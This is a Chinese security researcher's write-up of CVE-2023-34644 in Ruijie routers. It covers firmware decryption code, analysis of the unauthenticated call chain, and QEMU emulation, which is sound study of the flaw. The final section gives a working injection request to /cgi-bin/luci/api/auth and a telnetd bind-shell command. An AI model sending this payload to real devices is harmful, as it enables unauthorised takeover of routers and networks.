# CVE-2023-34644 代码注入

## 1.漏洞描述

睿捷网络家庭路由器和中继器 RG-EW 系列 EW_3.0(1)B11P204，RG-NBS 和 RG-S1930 系列交换机 SWITCH_3.0(1)B11P218，商业 VPN 路由器 RG-EG 系列 EG_3.0(1)B11P216，无线接入点 EAP 和 RAP 系列 AP_3.0(1)B11P218，以及无线控制器 NBC 系列 AC_3.0(1)B11P86 中的漏洞，允许未经授权的远程攻击者通过向/cgi-bin/luci/api/auth 发送特制的 POST 请求来获取最高权限。

## 2.mips 分析环境搭建

要求工具：

RetDec IDA plugin：https://github.com/avast/retdec-idaplugin

Retdec：https://github.com/avast/retdec

cmake

ida8.3，ida9.0(可以直接反汇编 mips，不用安装 retdec 插件)

照着很多教程搭了很多遍还是没有弄好，遂放弃，后来发现我的 ida9.0 可以直接反汇编 mips，太好了。（jeb 也可以反汇编 mips 的，但是他那个界面我用着不太习惯）

另外就是使用 buildroot 安装交叉编译环境

## 3.固件解密

由于没有找到 EW_3.0(1)B11P219_EW1200I_10200109_install_encypto.bin 老固件，所以我们用新版本 EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin 的固件尝试一下

老版本的固件作者已经提供了解密后的，新版本的解密思路和老版本差不过

直接使用 binwalk 是识别不出来的：

![image-20250120161644681](./assets/CVE-2023-34644代码注入/image-20250120161644681.png)

![image-20250120161746057](./assets/CVE-2023-34644代码注入/image-20250120161746057.png)

根据 winmt 师傅的说法，文件末尾会填充大量的 `\xff` 或者 `\x00` 字节码，这里有大量的重复字节码 `0x80` ，猜测可能是单字节异或 `key` 得到的。尝试拿 `0xff` 与 `0x80` 进行异或，得到疑似 `key` 值 `0x7f`

python 编写一个简单的解密脚本：

```python
def xor_firmware(input_file, output_file):
    try:
        with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
            while byte := f_in.read(1):
                f_out.write(bytes([byte[0] ^ 0x7f]))
        print(f"处理完成，结果已保存到 {output_file}")
    except IOError as e:
        print(f"文件操作失败: {e}")

if __name__ == "__main__":
    input_file = "EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin" 
    output_file = "output_firmware.bin" 
    xor_firmware(input_file, output_file)
```

binwalk 再次识别可以识别出来

![image-20250120162931177](./assets/CVE-2023-34644代码注入/image-20250120162931177.png)

![image-20250120163029544](./assets/CVE-2023-34644代码注入/image-20250120163029544.png)

识别出来的文件系统：

![image-20250120163219155](./assets/CVE-2023-34644代码注入/image-20250120163219155.png)

拿到文件系统后，可以去寻找负责加解密的程序

![image-20250120163501358](./assets/CVE-2023-34644代码注入/image-20250120163501358.png)

对 rg-upgrade-crypto 二进制文件进行分析:

在 main 函数里面，主要是对运行文件时输入的参数进行一个处理，真正处理的函数在 sub_4010c0 里面

![image-20250120172853721](./assets/CVE-2023-34644代码注入/image-20250120172853721.png)

分析发现，加解密用的是一套流程：

![image-20250120174504784](./assets/CVE-2023-34644代码注入/image-20250120174504784.png)

主要加密函数调用的是 sub_400B04()

因为 IDA 里面定义了很多的宏，所以如果对这些自定义的宏不太了解的化看起来还是挺吃力的，Ghidra 对 Mips 指令的支持更好，而且不用安装相关插件就可以反汇编，而 ida 要高版本才行，安装 retdec 插件我暂时也还没安装成功

左边是 IDA 的反汇编，右边是 Ghidra 的反汇编，这样我们就可以分析出宏 BYTEn(x)的含义为从 x 的位置取第 n 个字节

![image-20250121090656006](./assets/CVE-2023-34644代码注入/image-20250121090656006.png)

对照着反汇编，参考 winmt 师傅写的解密脚本：

主要流程：分别打开和创建加解密文件，分配加解密的缓冲区，首先读取并丢弃掉前 22 字节头部，对剩余内容进行逐轮次解密，解密的过程前几轮密钥是在出事后，然后密钥就会一直保持不变直到下一轮迭代的解密

```C
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <malloc.h>
#include <sys/stat.h>

typedef unsigned char uint8_t;
#define BYTE(x, n) (*((uint8_t *)&(x)+n))

void error_msg(char *msg)
{
	puts(msg);
	exit(-1);
}

int num1 = 1, num2 = 0x10001;

void decrypt(uint8_t *enc_buf, uint8_t *dec_buf, int length)
{
	for (int i = 0; i < length; i++)
	{
		int sum = (uint8_t)num1 + (uint8_t)num2 + BYTE(num2, 1) + BYTE(num2, 2);
		BYTE(num2, sizeof(num2)/sizeof(uint8_t)-1) = sum % 2;
	
		for (int j = 0; j < 6; j++)
			*((uint8_t *)&num1 + j) = *((uint8_t *)&num1 + j + 1);
	
		uint8_t key = 0;
		for (int k = 0; k < 8; k++)
			key |= *((uint8_t *)&num1 + k) << k;
		*(uint8_t *)(dec_buf + i) = *(uint8_t *)(enc_buf + i) ^ key;
	}
}

int main(int argc, char **argv, const char **envp)
{
	if (argc < 2) error_msg("Usage: ./rg-decrypt [encrypted_firmware_path]");

	char *enc_path = strdup(argv[1]);
	char *dec_path = malloc(strlen(argv[1]) + 0x10);
	strcpy(dec_path, argv[1]);
	strcat(dec_path, ".decrypted");

	struct stat stat_buf;
	int stat_fd = stat(enc_path, &stat_buf);
	if (stat_fd < 0) error_msg("The encrypted firmware does not exist !");
	int size = stat_buf.st_size;

	uint8_t *enc_buf = (uint8_t *)malloc(0x1000);
	uint8_t *dec_buf = (uint8_t *)malloc(0x1000);

	int enc_fd = open(enc_path, O_RDONLY);
	if (enc_fd < 0) error_msg("Error to open the encrypted firmware !");

	int dec_fd = open(dec_path, O_WRONLY | O_CREAT, S_IREAD | S_IWRITE | S_IRGRP);
	if (dec_fd < 0) error_msg("Error to create the decrypted firmware !");

	if (read(enc_fd, enc_buf, 22) != 22) error_msg("Error to read from the encrypted firmware !");
	size -= 22;

	while(size > 0)
	{
		int len = size;
		if (size > 0x1000) len = 0x1000;
	
		memset(enc_buf, 0, sizeof(enc_buf));
		memset(dec_buf, 0, sizeof(dec_buf));
	
		if (read(enc_fd, enc_buf, len) != len) error_msg("Error to read from the encrypted firmware !");
		decrypt(enc_buf, dec_buf, len);
		if (write(dec_fd, dec_buf, len) != len) error_msg("Error to write into the decrypted firmware !");
		size -= len;
	}

	free(enc_buf);
	free(dec_buf);
	close(enc_fd);
	close(dec_fd);
	return 0;
}

```

编译：

```shell
gcc rg-decryt.c  -o rg-decryt -m32 -static -g
```

运行：

```shell
./rg-decryt 'EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin' 
```

在每一轮的加密过程中，只有每一轮前几次加密的密钥不是 127，后面的密钥都是 127

可以对比一下前后不同解密算法，用 binwalk 分析后的结果：

![image-20250121185028335](./assets/CVE-2023-34644代码注入/image-20250121185028335.png)

## 4.解密后的固件

使用 binwalk 分析一下：

![image-20250118174114859](./assets/CVE-2023-34644代码注入/image-20250118174114859.png)

![image-20250118174213498](./assets/CVE-2023-34644代码注入/image-20250118174213498.png)

![image-20250118174310899](./assets/CVE-2023-34644代码注入/image-20250118174310899.png)

识别出来的文件系统：

![image-20250118174705138](./assets/CVE-2023-34644代码注入/image-20250118174705138.png)

## 5.luci 工作原理

LuCI 作为“FFLuCI”诞生于 2008 年 3 月份，目的是为 OpenWrt 固件从 Whiterussian 到 Kamikaze 实现快速配置接口。Lua 是一个小巧的脚本语言，很容易嵌入其它语言。轻量级 LUA 语言的官方版本只包括一个精简的核心和最基本的库。这使得 LUA 体积小、启动速度快，从而适合嵌入在别的程序里。UCI 是 OpenWrt 中为实现所有系统配置的一个统一接口，英文名 Unified Configuration Interface，即统一配置接口。LuCI, 即是这两个项目的合体，可以实现路由的网页配置界面。

最初开发这个项目的原因是没有一个应用于嵌入式的免费，干净，可扩展以及维护简单的网页用户界面接口。大部分相似的配置接口太依赖于大量的 Shell 脚本语言的应用，但是 LuCi 使用的是 Lua 编程语言，并将接口分为逻辑部分，如模板和视图。LuCI 使用的是面向对象的库和模板，确保了高效的执行，轻量的安装体积，更快的执行速度以及最重要的一个特性————更好的可维护性。

Lua 工作和配置文件在/usr/lib/lua 目录下

Luci 工作和配置文件在/usr/lib/lua/luci 目录下

luci 目录常用到的是：controller、view、以及 Model 目录，它们构成一个 MVC 管理机制

![image-20250122110035125](./assets/CVE-2023-34644代码注入/image-20250122110035125.png)

在 `www/index.html` 下会指定 cgi 程序的启动脚本

```
<a href="/cgi-bin/luci/">
```

而在 luci 中，会指定加载的模块，调度器索引缓存路径，启动的 run 函数

```
#!/usr/bin/lua
require "luci.cacheloader"
require "luci.sgi.cgi"
luci.dispatcher.indexcache = "/tmp/luci-indexcache"
luci.sgi.cgi.run()
```

在 `usr/lib/lua/luci/sgi/cgi.lua` 中，创建一个 HTTP 请求对象，创建一个协程来处理 HTTP 请求，并且循环处理协程的状态，直到协程结束

```lua
function run()
	local r = luci.http.Request(
		luci.sys.getenv(),
		limitsource(io.stdin, tonumber(luci.sys.getenv("CONTENT_LENGTH"))),
		ltn12.sink.file(io.stderr)
	)

	local x = coroutine.create(luci.dispatcher.httpdispatch)
	local hcache = ""
	local active = true

	while coroutine.status(x) ~= "dead" do
		local res, id, data1, data2 = coroutine.resume(x, r)

		if not res then
			print("Status: 500 Internal Server Error")
			print("Content-Type: text/plain\n")
			print(id)
			break;
		end

		if active then
			if id == 1 then
				io.write("Status: " .. tostring(data1) .. " " .. data2 .. "\r\n")
			elseif id == 2 then
				hcache = hcache .. data1 .. ": " .. data2 .. "\r\n"
			elseif id == 3 then
				io.write(hcache)
				io.write("\r\n")
			elseif id == 4 then
				io.write(tostring(data1 or ""))
			elseif id == 5 then
				io.flush()
				io.close()
				active = false
			elseif id == 6 then
				data1:copyz(nixio.stdout, data2)
				data1:close()
			end
		end
	end
end
```

上述 run()函数中，创建了一个协同程序，调用 httpdispatch()函数，而这个函数位于 dispatcher.lua 中。通过分析可以发现，luci 真正的主体部分都在 dispatcher.lua 脚本里

dispatcher.lua 是 LuCI 框架中的调度器模块，负责处理 HTTP 请求并将其分派到相应的控制器:

* 主要函数：
  * `entry`：创建一个新的调度节点
  * `httpdispatch`：处理 HTTP 请求。它解析请求路径，并将请求分派到相应的处理函数
  * `dispatch`：用于将请求分派到相应的处理函数。它解析请求路径，并根据路径找到相应的节点，然后调用节点的目标函数
* 辅助函数：
  * `build_url`：构建相对 URL。
  * `node_visible`：检查节点是否可见。
  * `node_childs`：返回节点的子节点。
  * `error404` 和 `error500`：发送 404 和 500 错误响应。
  * `createindex` 和 `createtree`：创建调度树和索引。

lua 与 C/C++交互，主要靠 lua API 和向 lua 注册好的函数：

![image-20250213214034257](./assets/CVE-2023-34644代码注入/image-20250213214034257.png)

## 6.漏洞分析

### 6.1 lua 链分析

前半部分的调用链条如下：

![lua_line.drawio](./assets/CVE-2023-34644代码注入/lua_line.drawio.png)

固件的 cgi 部分是用 lua 语言写的，挖掘未授权漏洞，那么我们就需要找到与鉴权相关的 API 接口

在 `/usr/lib/` 路径下存在一个 `lua` 目录，其中存放了很多 `lua` 文件，主要是对前端传入的数据进行处理传递给 cgi

搜索 sysauth，可以找到在 api.lua 文件中 sysauth = false

![image-20250122102823959](./assets/CVE-2023-34644代码注入/image-20250122102823959.png)

在 `/usr/lib/lua/luci/controller/eweb/api.lua` 文件中，配置了

```lua
 entry({"api", "auth"}, call("rpc_auth"), nil).sysauth = false
```

而 entry 函数用于创建一个新的调度节点，定义在 `usr/lib/lua/luci/dispatcher.lua`

```lua
--- Create a new dispatching node and define common parameters.
-- @param	path	Virtual path
-- @param	target	Target function to call when dispatched.
-- @param	title	Destination node title
-- @param	order	Destination node order value (optional)
-- @return			Dispatching tree node
function entry(path, target, title, order)
	local c = node(unpack(path))

	c.target = target
	c.title = title
	c.order = order
	c.module = getfenv(2)._NAME

	return c
end
```

也就意味着当用户访问 `/api/auth` 路径的时候，将会调用 `rpc_auth` 函数 ，并且这里的 `sysauth` 是 false，表示无需系统认证就可以访问

跟踪 `rpc_auth` 函数：

首先引入了一些模块，然后判断 HTTP_CONTENT_LENGTH 的长度是否大于 1000 字节，如果不大于的化就会返回 json 格式，并进行 handle 处理

```lua
-- 认证模块
function rpc_auth()
    local jsonrpc = require "luci.utils.jsonrpc"
    local http = require "luci.http"
    local ltn12 = require "luci.ltn12"
    local _tbl = require "luci.modules.noauth"
    if tonumber(http.getenv("HTTP_CONTENT_LENGTH") or 0) > 1000 then
        http.prepare_content("text/plain")
        -- http.write({code = "1", err = "too long data"})
        return "too long data"
    end
    http.prepare_content("application/json")
    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)
end
```

`jsonrpc` 的 `handle` 函数：

这里主要关注一下 `resolve(tbl, json.method)`

```lua
function handle(tbl, rawsource, ...)
    local decoder = luci.json.Decoder()
    local stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())
    local json = decoder:get()
    local response
    local success = false

    if stat then
        if type(json.method) == "string" then
            local method = resolve(tbl, json.method)
            if method then
                response = reply(json.jsonrpc, json.id, proxy(method, json.params or {}))
            else
                response = reply(json.jsonrpc, json.id, nil, {code = -32601, message = "Method not found."})
            end
        else
            response = reply(json.jsonrpc, json.id, nil, {code = -32600, message = "Invalid request."})
        end
    else
        response = reply("2.0", nil, nil, {code = -32700, message = "Parse error.", err = err})
    end

    return luci.json.Encoder(response, ...):source()
end
```

回溯重新定位一下 `tbl` , `local _tbl = require "luci.modules.noauth"` 相当于一个 table，里面定义了四个函数：login、singlelogin、merge、checkNet

```lua
-- 登录
function login(params)
...
-- 单点登录
function singleLogin()
...
-- 网络合并
function merge(params)
...
-- ping checknet
function checkNet(params)
```

singleLogin 函数没有可以控制的参数，所以不考虑；checkNet 函数中参数可控的字段只有 params.host，并拼接入了命令字符串执行，但是在之前有 tool.checkIp(params.host)对其的合法性进行了检查，无法绕过；login 登录验证函数，这里可控的字段乍一看比较多，比如 params.password，params.encry，params.limit 等字段，但是追入分析真正可控的只有 password 字段，password 字段用 includeXxs 函数（同样在 tool.lua 中）过滤了危险字符（[`&$;|]），但是并没有过滤\n 这个命令分隔符，后面又调用了 checkPasswd，里面又调用了 cmd.devSta.get 函数进一步处理，接着又会调用 doParams 函数对传入的 json 参数进行解析，在 doParams 的 encode 时候会对\n 类字符进行转义，所以这里我们也无法利用

所以，现在关注 merge 方法，merge 方法调用了 cmd.devSta.set，但是由于之前没有任何过滤，无需使用换行符作为命令分隔符，最简单的分号、反引号之类的即可，故 doParams 函数中的 encode 不会造成影响

```lua
function merge(params)
    local cmd = require "luci.modules.cmd"
    return cmd.devSta.set({device = "pc", module = "networkId_merge", data = params, async = true})
end
```

```lua
devSta[opt[i]] = function(params)
    local model = require "dev_sta"
    params.method = opt[i]
    params.cfg_cmd = "dev_sta"
    local data, back, ip, password, shell = doParams(params)
    return fetch(model.fetch, shell, params, opt[i], params.module, data, back, ip, password)
```

下面，data 字段又传入了 dev_sta.lua 的 fetch 函数，在这里面，对一些字段赋予了真假值后，最终将参数都传递给了/usr/lib/lua/libuflua.so 中的 client_call 函数，接下来，就是对二进制文件进行分析

```lua
function fetch(cmd, module, param, back, ip, password, force, not_change_configId, multi)
    local uf_call = require "libuflua"
    local ctype

    ctype = get_ctype()
    param = param or ""
    ip = ip or ""
    password = password or ""
    if force and force == "1" then
    	force = true
    else
    	force = false
    end

    if back and back == "1" then
    	back = true
    else
    	back = false
    end   

    if not_change_configId then
    	not_change_configId = true
    else
    	not_change_configId = false
    end

    if multi then
    	multi = true
    else
    	multi = false
    end

    local stat = uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)
    return stat
end
```

根据二进制的调用链条进行分析，发现其实调用的是 uf_client_call 函数，这是在其他共享库中定义的函数

![image-20250213224114914](./assets/CVE-2023-34644代码注入/image-20250213224114914.png)

![image-20250213224208604](./assets/CVE-2023-34644代码注入/image-20250213224208604.png)

![image-20250213224346085](./assets/CVE-2023-34644代码注入/image-20250213224346085.png)

搜索并对比上面的库文件可以确定是 libunifyframe.so

![image-20250213224451764](./assets/CVE-2023-34644代码注入/image-20250213224451764.png)

其函数首先判断了 method 的类型，然后解析出报文中各字段的值，后面将其键值对添加到一个 JSON 对象中，接着将最终处理好的 JSON 对象转换为 JSON 格式的字符串，通过 uf_socket_msg_write 用 socket 套接字进行数据传输

![image-20250213224638859](./assets/CVE-2023-34644代码注入/image-20250213224638859.png)

![image-20250213224803605](./assets/CVE-2023-34644代码注入/image-20250213224803605.png)

![image-20250213224828464](./assets/CVE-2023-34644代码注入/image-20250213224828464.png)

因为有 write 进行数据发送，那么肯定也存在一个地方 read 进行数据接收，查找一下可以定位到相关的文件，这里采取的是本地通信的方式

![image-20250213224942611](./assets/CVE-2023-34644代码注入/image-20250213224942611.png)

同时我们也可以验证，在初始化脚本/etc/init.d/unifyframe-sgi 中，启动了 unifyframe-sgi.elf，即说明 unifyframe-sgi.elf 一直挂在进程中。因此，我们可以确定 unifyframe-sgi.elf 就是接收 libunifyframe.so 所发数据的文件（这里采用了 Ubus 总线进行进程间通信）

![image-20250213225136644](./assets/CVE-2023-34644代码注入/image-20250213225136644.png)

### 6.2 unifyframe-sgi.elf 分析

下图是 zikh26 师傅梳理的 /usr/sbin/unifyframe-sgi.elf 文件中调用链和几个线程和信号量的关系

![image-20250213222158874](./assets/CVE-2023-34644代码注入/image-20250213222158874.png)

可以看见 main 函数里面调用了 uf_socket_msg_read

![image-20250213230148896](./assets/CVE-2023-34644代码注入/image-20250213230148896.png)

对 main 函数进行详细的分析，最前面是创建临时目录和文件的基本操作，分配资源和初始化系统状态

```c
  mkdir("/tmp/uniframe_sgi", 511, envp);
  v49 = v43;
  memset(v43, 0, 64);
  strcpy(v43, "/tmp/sgi");
  strcat(v43, ".sgi_ufm");
  v5 = open(v43, 770, 438);
  dword_435660 = v5;
  if ( v5 < 0 )
  {
    v6 = *(_DWORD *)_errno_location();
    v7 = strerror(v6);
    v8 = v6;
    v9 = "Failed to open file %s, errno=%d, %s.";
LABEL_8:
    printf(v9, ".sgi_ufm", v8, v7);
    return 0;
  }
  v44[0] = 1;
  v45 = 0;
  v44[1] = 0;
  v46 = 0;
  v53 = v44;
  if ( fcntl(v5, 6, v44) < 0 )
  {
    v10 = (int *)_errno_location();
    if ( *v10 == 13 || *v10 == 11 )
      close(dword_435660);
    v11 = *v10;
    v7 = strerror(v11);
    v8 = v11;
    v9 = "Failed to lock file %s, errno=%d, %s.";
    goto LABEL_8;
  }
  reserve_record();
  reserve_core();
```

下面是一个 while 循环，这里我们需要了解 getopt 这个函数（由 Unix 标准库提供，包含在 <unistd.h> 头文件中）

函数原型为：

```c
#include <unistd.h>
int getopt(int argc, char * const argv[], const char *optstring)；
```

* argc 是参数个数，和 main 函数的 argc 一样；
* argv 是字符串指针，和 main 函数的 argv 一样；
* optstring 是选项字符串
  * 字符代表一个选项
  * 没有冒号就表示纯选项，不需要参数
  * 一个冒号代表该选项之后必须带有参数，可以使用空格，也可以不使用
  * 两个冒号代表该项之后的参数可写可不写

比如：

```
"vha:b:c::"就表示：

支持-v选项，通常用于打印版本号
支持-h选项，通常用于打印帮助信息
支持-a选项，后面必须带有一个参数
支持-b选项，后面必须带有一个参数
支持-c选项，后面可以带参数，也可以不用带参数
```

那么这里就是运行/usr/sbin/unifyframe-sgi.elf 需要其中的一个参数了

```c
  while ( 1 )
  {
    v13 = getopt(argc, argv, "dh");
    if ( v13 == -1 )
      break;
    if ( v13 == 'd' )
    {
      uf_log_printf(uf_log, "ERROR (%s %s %d)open debug mode!", "sgi.c", "main", 1566);
      g_debug = 1;
    }
    else if ( v13 == 'h' )
    {
      puts("unifyframe-sgi.elf:");
      puts("-h : show help message ");
      puts("-d: open debug mode");
      goto LABEL_98;
    }
  }
```

再后是一大堆 "排比句"，提取 lua 传递过来的参数，这里面就包括我们的 uf_socket_msg_read，再后面解析字段、执行具体操作的两个函数分别为 parse_content、add_pkg_cmd2_task

![image-20250214125607972](./assets/CVE-2023-34644代码注入/image-20250214125607972.png)

而在 parse_content 中进行数据解析的具体位置应该是 parse_obj2_cmd，parse_obj2_cmd 函数结束后，会执行 pkg_add_cmd

![image-20250214125841973](./assets/CVE-2023-34644代码注入/image-20250214125841973.png)

再回到我们继续执行的 add_pkg_cmd2_task 函数，前面部分是一些检查和无关的操作，后面发现调用了一个名字很敏感的函数 uf_cmd_call，用于命令执行相关的

![image-20250214130302473](./assets/CVE-2023-34644代码注入/image-20250214130302473.png)

跟踪参数的传递处理，又发现一个重要的函数 ufm_handle

![image-20250214130850761](./assets/CVE-2023-34644代码注入/image-20250214130850761.png)

在这里面，通过比较，触发关键函数 sub_40FD5C

![image-20250214131609711](./assets/CVE-2023-34644代码注入/image-20250214131609711.png)

通过 sub_40FD5C（v2 是 data 字段的值，v3 是 2（devSta 所导致的））的比较，又触发了另一个关键函数 sub_40CEAC

![image-20250214131836282](./assets/CVE-2023-34644代码注入/image-20250214131836282.png)

在这里面，v63 是上面拼接后的最终命令

![image-20250214132036286](./assets/CVE-2023-34644代码注入/image-20250214132036286.png)

ufm_commit_add 函数又调用了 async_cmd_push_queue 函数

![image-20250214132148870](./assets/CVE-2023-34644代码注入/image-20250214132148870.png)

async_cmd_push_queue 函数中会跳转到 label_32, 这里有一个信号量的操作，信号量加上了 1，意味着其他地方应该是有 sem_wait 阻塞了一个线程的执行

![image-20250214132247339](./assets/CVE-2023-34644代码注入/image-20250214132247339.png)

对其交叉引用，定位到了 sub_41AFC8 函数

![image-20250214132413931](./assets/CVE-2023-34644代码注入/image-20250214132413931.png)

这里面又调用了 sub_41ADF0 函数

![image-20250214132602001](./assets/CVE-2023-34644代码注入/image-20250214132602001.png)

跟进，也就是在这里，触发命令执行，且没有做任何过滤

![image-20250214132723831](./assets/CVE-2023-34644代码注入/image-20250214132723831.png)

这里面又用 popen() 通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以运行命令来开启一个进程，至此，该未授权 RCE 漏洞的调用链分析完毕

![image-20250214133022928](./assets/CVE-2023-34644代码注入/image-20250214133022928.png)

## 7.设备仿真

目前比较常用的 FirmAE，EMUX，firmware-analysis-plus 仿真工具都存在各种问题，又因为该型号的固件是 mipsel 架构的，可以使用 qemu-system 直接进行仿真模拟

这里下载内核和文件系统：

```
wget https://people.debian.org/\~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
wget https://people.debian.org/\~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2 
```

qemu 启动脚本 start.sh:

这里设定了 cpu 为 74kf，因为若不特别说明，默认是 24Kc，而该固件需要较高版本的 cpu，不然在之后 chroot 切换根目录的时候就会出现 Illegal instruction（非法指令）错误。可用 qemu-system-mipsel -cpu help 命令查看 qemu-system-mipsel 所有支持的 cpu 版本

```shell
#!/bin/bash
 
sudo qemu-system-mipsel \
    -cpu 74Kf \
    -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_squeeze_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
```

在仿真开始之前，我们还需要对进行相关的网络配置，以便宿主机可以与 qemu 进行网络通信（因为我们需要将路由器的文件系统上传到 QEMU 虚拟机）

通信的大概原理是创建一个虚拟的网桥，并且开一个接口给 qemu，然后流量的发送都是通过这个网桥

宿主机先安装依赖，用来配置网络

```shell
sudo apt-get install bridge-utils uml-utilities
```

创建一个 net.sh: 赋予执行权限并运行

```shell
#!/bin/sh
sudo brctl addbr br0                   # 添加一个名为 br0 的网桥
sudo ifconfig br0 192.168.2.3/24 up    # 启用 br0 接口
sudo tunctl -t tap0 -u root            # 创建一个只许 root 访问的 tap0 接口
sudo ifconfig tap0 192.168.2.1/24 up   # 启用 tap0 接口
sudo brctl addif br0 tap0              # 在虚拟网桥中增加一个 tap0 接口
```

配置成功后，使用 ifconfig 命令，会发现主机多出两个虚拟网卡 `br0` 和 `tap0`

如果不需要了，使用如下的脚本即可取消配置 unset_net.sh:

```shell
#!/bin/sh
sudo ifconfig br0 down # 关闭设备
sudo ifconfig tap0 down # 关闭设备
sudo brctl delbr br0 # 删除网桥
sudo tunctl -d tap0 # 删除网卡
```

接下来，在 qemu 里面使用命令 `ifconfig eth0 192.168.2.2/24 up` 即可配置成功，接下来可以使用 `ping` 命令检查一下是否网络互通

启动 start.sh 脚本，账号密码都是 root。先按 ctrl + a， 释放之后再按 x 就可以停止了

![image-20250214140608155](./assets/CVE-2023-34644代码注入/image-20250214140608155.png)

接下里，还需要将路由器的文件系统上传到 qemu 虚拟机当中，让 qemu 虚拟机来启动路由器

先将文件系统用 `tar` 进行压缩打包，然后使用 `scp` 命令传到 qemu 虚拟机当中，再将文件系统解压

接着，进入解压的文件系统，这里 chmod 给全部文件都赋予所有权限，是为了方便在仿真过程中不用再考虑权限问题的影响了。之后使用 mount 将/proc 和/dev 系统目录挂载到 rootfs 中的 proc 和 dev 目录（仿真系统只是切换了根目录，本质还是 qemu 虚拟机的系统，故 proc 和 dev 这两个特殊的虚拟文件夹（用于提供系统信息和设备的访问）仍应该是这个系统本身的目录，即 qemu 虚拟机的系统目录，而切换了根目录后，proc 和 dev 也被切换，因此需要挂载为原先的目录），最后用 chroot 将 rootfs 切换为根目录，完成准备工作

```shell
cd rootfs
chmod -R 777 ./
mount --bind /proc proc
mount --bind /dev dev
chroot . /bin/sh
```

对于 OpenWRT 来说，内核加载完文件系统后，首先会启动 `/sbin/init` 进程，其中会进一步执行 `/etc/preinit和/sbin/procd`，进行初步初始化。这当然也是仿真模拟的第一步，启动 `/sbin/init` 后，会卡住挂在进程中，我们可以再 ssh 开一个新窗口进行后续操作，也可以用 `/sbin/init &` 将其作为后台进程执行

接着，真实系统会根据 `/etc/inittab` 中按编号次序执行 `/etc/rc.d` 中的初始化脚本，而 `/etc/rc.d` 中的文件都是 `/etc/init.d` 中对应文件的软链接

![image-20250214220728283](./assets/CVE-2023-34644代码注入/image-20250214220728283.png)

由于此次仿真我们仅需要验证我们的漏洞，所以我们进行部分仿真即可

首先，我们需要启动 httpd 服务，对应着/etc/init.d/lighttpd 初始化脚本，启动：

```shell
/etc/init.d/lighttpd start
```

会出现缺失文件报错：

![image-20250214153639777](./assets/CVE-2023-34644代码注入/image-20250214153639777.png)

由于是部分仿真的，没有按照次序，故之前没有创建这个文件，而通过查看该初始化脚本，可以发现此处/rom/etc/lighttpd/lighttpd.conf 的缺失并无影响。因此，创建/var/run/lighttpd.pid 空文件后，再次 `/etc/init.d/lighttpd start` 启动服务即可

```shell
mkdir /var/run/lighttpd.pid
```

此时，我们可以看到进程当中成功启动了 lighttpd 进程

![image-20250214153608765](./assets/CVE-2023-34644代码注入/image-20250214153608765.png)

并且此时，我们可以正常通过游览器访问其 api 接口

![image-20250214153729258](./assets/CVE-2023-34644代码注入/image-20250214153729258.png)

接下来，需要启动需要启动 `nifyframe-sgi.elf`，对应 `/etc/init.d/unifyframe-sgi`的初始化脚本。用 `/etc/init.d/unifyframe-sgi start`直接启动后也会出现报错

![image-20250214153809912](./assets/CVE-2023-34644代码注入/image-20250214153809912.png)

因为 `unifyframe-sgi.elf`中用到了ubus总线进行进程间通信，因此需要先执行 `/sbin/ubusd`启动ubus通信，才能启动 `uf_ubus_call.elf`，继而才能再启动 `unifyframe-sgi.elf`

```shell
/sbin/ubusd &
```

后面又会报一个 `segment fault`，是由于缺少文件导致的，这里复制一个就好了

```shell
mkdir /tmp/coredump
mkdir /tmp/rg_device
cp /sbin/hw/60010081/rg_device.json  /tmp/rg_device/rg_device.json
/usr/sbin/unifyframe-sgi.elf
```

此时进程中的 `/usr/sbin/unifyframe-sgi.elf`程序才在运行

![](./assets/CVE-2023-34644代码注入/image-20250214155605401.png)

总结下来，也就是下面的命令，解决相关报错和设备仿真：

```shell
tar czf rootfs.tar.gz ./rootfs
scp rootfs.tar.gz root@192.168.2.2:/root/rootfs
cd rootfs
chmod -R 777 ./
mount -bind /proc proc
mount -bind /dev dev
chroot . /bin/sh
/sbin/init
mkdir /var/run/lighttpd.pid
/etc/init.d/lighttpd start
/sbin/ubusd &

mkdir /tmp/coredump
mkdir /tmp/rg_device
cp /sbin/hw/60010081/rg_device.json  /tmp/rg_device/rg_device.json
/usr/sbin/unifyframe-sgi.elf
```

## 8.poc验证

```
POST /cgi-bin/luci/api/auth HTTP/1.1

Host: 192.168.2.2

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Length: 66



{"method": "merge", "params": {"foo": "'`ls / > /www/hack.txt`'"}}
```

![image-20250214161019987](./assets/CVE-2023-34644代码注入/image-20250214161019987.png)

![image-20250214161033551](./assets/CVE-2023-34644代码注入/image-20250214161033551.png)

此外，`telnetd` 是 `busybox` 程序中集成的一个服务，所以在嵌入式设备中一般都可以进行开启

```shell
telnetd -p 23090 -l /bin/sh
```

我们也可以这样获得一个shell
